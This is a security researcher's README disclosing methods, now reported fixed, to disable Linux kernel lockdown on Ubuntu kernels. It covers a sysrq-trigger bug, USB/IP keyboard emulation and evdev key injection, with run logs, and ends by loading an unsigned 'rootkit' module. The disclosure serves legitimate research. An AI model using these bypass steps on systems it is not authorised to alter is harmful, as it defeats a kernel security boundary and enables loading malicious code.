unlockdown
==========

This repo demonstrates some ways to disable or bypass kernel lockdown on Ubuntu (and some other) kernels without physical access to the machine, essentially bypassing this security feature.

(Updated 21.03.2020.) At this point, all proposed bypass methods have been fixed on Ubuntu, Fedora and Debian (see [this](https://github.com/xairy/unlockdown/issues/1) for details).

## Story

Once upon a time, while working on some [USB fuzzing](https://github.com/google/syzkaller/blob/master/docs/linux/external_fuzzing_usb.md) related stuff, I was about to trace the kernel via `kprobe` on my new laptop, but instead...

```
perf-tools/bin# ./kprobe 'r:usb usb_control_msg rv=$retval'
Tracing kprobe usb. Ctrl-C to end.
./kprobe: line 228: echo: write error: Operation not permitted
ERROR: adding kprobe "r:usb usb_control_msg $retval".
Last 2 dmesg entries (might contain reason):
...
    [  235.815912] Lockdown: kprobe: Use of kprobes is restricted; see man kernel_lockdown.7
Exiting.
```

Lockdown, eh?

## What is lockdown?

Linux kernel lockdown is a security feature that aims at restricting root's ability to modify the kernel at runtime.
See more details in ["Kernel lockdown in 4.17?"](https://lwn.net/Articles/750730/) by Jonathan Corbet and ["Linux kernel lockdown and UEFI Secure Boot"](https://mjg59.dreamwidth.org/50577.html) by Matthew Garrett.
After many years of being in review, the lockdown patchset has been [merged](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=aefcf2f4b58155d27340ba5f9ddbe9513da8286d) into the upstream kernel in version 5.4.
Ubuntu has applied [a version of this patchset](https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/bionic/commit/?id=49b04f8acc7788778a360e7462353a86eaffca53) to their kernels in 2018.

Lockdown is enabled by default on my ThinkPad X1 Carbon laptop with Ubuntu Bionic:

```
# uname -a
Linux x1 4.15.0-74-generic #84-Ubuntu SMP Thu Dec 19 08:06:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
# dmesg
...
[    0.000000] secureboot: Secure boot enabled
[    0.000000] Kernel is locked down from EFI secure boot; see man kernel_lockdown.7
...
```

## Disabling lockdown

The early versions of the lockdown patchset integrated kernel lockdown with UEFI secure boot and had a way to disable lockdown at runtime by sending an Alt+SysRq+X key sequence on an attached physical keyboard. Later those patches [were](https://lore.kernel.org/linux-security-module/20190306235913.6631-1-matthewgarrett@google.com/) [dropped](https://lore.kernel.org/linux-security-module/CACdnJuuxAM06TcnczOA6NwxhnmQUeqqm3Ma8btukZpuCS+dOqg@mail.gmail.com/) from the upstream patchset, but not from the distro backports.

While some ways to trigger Alt+SysRq+X from software (e.g. via `/dev/uinput`) were accounted for and disabled, a few still remain.
Here I'll show some methods to disable lockdown by injecting an Alt+SysRq+X key sequence without having physical access to the machine.

### Method 0: sysrq-trigger

The lockdown patchset included a patch that disallowed disabling lockdown by triggering a SysRq via `/proc/sysrq-trigger`.
Unfortunately, the early versions of this patch contained a [bug](https://lore.kernel.org/lkml/15833.1551974371@warthog.procyon.org.uk/) and the restriction hadn't actually been enforced. On Ubuntu the bug has been [introduced](https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/bionic/commit/?id=531c25a35b2a93e025e72e04f16b0f3620ace581) with the first backport of the lockdown patches (since release in April 2018 for Bionic), and [fixed](https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1851380) in December 2019.

Disabling lockdown with this method is trivial as shown [here](00-sysrq-trigger/run.sh).

Vulnerable:

```
# uname -a
Linux x1 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux


# cd 00-sysrq-trigger/
# ./run.sh 
...
Done! Check dmesg.

# dmesg
...
[  315.760278] sysrq: SysRq : 
[  315.760282] This sysrq operation is disabled from userspace.
[  315.760292] Disabling Secure Boot restrictions
[  315.760296] Lifting lockdown
```

Fixed:

```
# uname -a
Linux x1 4.15.0-74-generic #84-Ubuntu SMP Thu Dec 19 08:06:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

# cd 00-sysrq-trigger/
# ./run.sh 
...
Done! Check dmesg.

# dmesg
...
[  208.412031] sysrq: SysRq : 
[  208.412032] This sysrq operation is disabled from userspace.
```

(The fix actually went into `4.15.0-72-generic`.)

### Method 1: USB/IP

Another way to turn off lockdown is to emulate a USB keyboard via [USB/IP](http://usbip.sourceforge.net/) (as long as it's enabled in the kernel) and send an Alt+SysRq+X key combination through it.
This has actually been previously pointed out by Jann Horn [here](https://lore.kernel.org/patchwork/patch/898080/#1090220).

Ubuntu's kernels have USB/IP enabled (`CONFIG_USBIP_VHCI_HCD=m` and `CONFIG_USBIP_CORE=m`) with signed `usbip_core` and `vhci_hcd` modules provided in the `linux-extra-modules-*` package.

(Jann has also mentioned the Dummy HCD/UDC module, which can indeed by used together with e.g. GadgetFS to do the same trick, but `CONFIG_USB_DUMMY_HCD` is not enabled in Ubuntu kernels.)

[Here](/01-usbip/keyboard.c) you can find the code that emulates a keyboard over USB/IP and sends an Alt+SysRq+X key combination. [This script](/01-usbip/run.sh) shows how to run it.
It's possible to simplify the implementation of this method by directly interacting with the VHCI driver to emulate a USB device, but I didn't bother with this.

(Updated 18.02.2020.) This method and has been fixed in [Ubuntu](https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1861238) and [Fedora](https://bugzilla.redhat.com/show_bug.cgi?id=1800859) kernels by dropping the "Add a SysRq option to lift kernel lockdown" patch.

```
# uname -a
Linux x1 4.15.0-74-generic #84-Ubuntu SMP Thu Dec 19 08:06:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

# cd 01-usbip/
# ./run.sh 
...
+ modprobe vhci_hcd
+ modprobe usbip_core
+ echo 1
+ gcc keyboard.c -o keyboard
+ usbip attach -r 127.0.0.1 -b 1-1
+ ./keyboard
waiting for connection...
connection from 127.0.0.1
OP_REQ_IMPORT
+ sleep 3
USBIP_CMD_SUBMIT
control request
bRequestType: 0x80 (IN), bRequest: 0x6, wValue: 0x100, wIndex: 0x0, wLength: 64
USBIP_CMD_SUBMIT
control request
bRequestType: 0x80 (IN), bRequest: 0x6, wValue: 0x100, wIndex: 0x0, wLength: 18
...
+ echo 'Done! Check dmesg.'
Done! Check dmesg.

# dmesg
[  422.346185] vhci_hcd vhci_hcd.0: USB/IP Virtual Host Controller
[  422.346190] vhci_hcd vhci_hcd.0: new USB bus registered, assigned bus number 5
...
[  423.233918] input: x as /devices/platform/vhci_hcd.0/usb5/5-1/5-1:1.0/0003:046D:C312.0002/input/input19
[  423.293702] hid-generic 0003:046D:C312.0002: input,hidraw1: USB HID v1.10 Keyboard [x] on usb-vhci_hcd.0-1/input0
[  423.429609] sysrq: SysRq : Disabling Secure Boot restrictions
[  423.429612] Lifting lockdown
```

### Method 2: evdev

(Added 21.03.2020.)

While Ubuntu's backport of the lockdown patchset [disallows](https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/bionic/commit/?id=531c25a35b2a93e025e72e04f16b0f3620ace581) injecting input events through `uinput`, it does nothing about `evdev`, that can also be used for input injection as long as you have a connected device that supports the required keys (e.g. a built-in laptop keyboard).

[Here](/02-evdev/evdev-sysrq.c) is the code that finds an appropriate `/dev/input/` device and injects Alt+SysRq+X sequence through it. [Here](/02-evdev/evdev-sysrq.py) is a Python program that does the same.

This method doesn't really give anything on top of the previous one from a practical standpoint, and it's actually fixed by the same patch that drops support for lifting lockdown via SysRq.

```
# uname -a
Linux x1 4.15.0-74-generic #84-Ubuntu SMP Thu Dec 19 08:06:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

# cd 02-evdev
# ./run.sh
+ echo 1
+ gcc ./evdev-sysrq.c -o evdev-sysrq
+ ./evdev-sysrq
checking /dev/input/event0
EV_KEY supported
checking /dev/input/event1
checking /dev/input/event10
checking /dev/input/event11
checking /dev/input/event12
checking /dev/input/event13
checking /dev/input/event14
checking /dev/input/event15
checking /dev/input/event16
EV_KEY supported
checking /dev/input/event2
EV_KEY supported
checking /dev/input/event3
EV_KEY supported
KEY_SYSRQ supported
EV_SYN supported
found device /dev/input/event3
sending Alt+SysRq+X sequence
done

# dmesg
...
[  192.723788] sysrq: SysRq : Disabling Secure Boot restrictions
[  192.723791] Lifting lockdown
```

### Method 3: TBD

TBD.

## So what?

What happens now that lockdown has been disabled?

At the very least I can now use `kprobe` on my laptop.
(No need to waste time remembering that [tricky key combination sequence](https://superuser.com/questions/562348/altsysrq-on-a-laptop) every time.)

```
perf-tools/bin# ./kprobe 'r:usb usb_control_msg rv=$retval'
Tracing kprobe usb. Ctrl-C to end.
     kworker/3:2-984   [003] d...   334.012577: usb: (hub_ext_port_status+0x8b/0x130 <- usb_control_msg) rv=0x4
     kworker/3:2-984   [003] d...   334.012590: usb: (usb_clear_port_feature+0x35/0x40 <- usb_control_msg) rv=0x0
     kworker/3:2-984   [003] d...   334.012595: usb: (hub_ext_port_status+0x8b/0x130 <- usb_control_msg) rv=0x4
```

And of course it's now also possible to do other fun stuff like loading unsigned kernel modules.

```
# uname -a
Linux x1 4.15.0-74-generic #84-Ubuntu SMP Thu Dec 19 08:06:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

# cd rootkit
# make
...

# insmod rootkit.ko
insmod: ERROR: could not insert module rootkit.ko: Required key not available

# cd ../01-usbip
# ./run.sh
...
Done! Check dmesg.
# dmesg | grep 'Lifting lockdown'
[  146.480046] Lifting lockdown

# cd ../rootkit
# insmod rootkit.ko
# dmesg | grep rootkit
[  175.953572] rootkit: loading out-of-tree module taints kernel.
[  175.953574] rootkit: module license 'unspecified' taints kernel.
[  175.953621] rootkit: module verification failed: signature and/or required key missing - tainting kernel
[  175.953975] rootkit successfully loaded
```
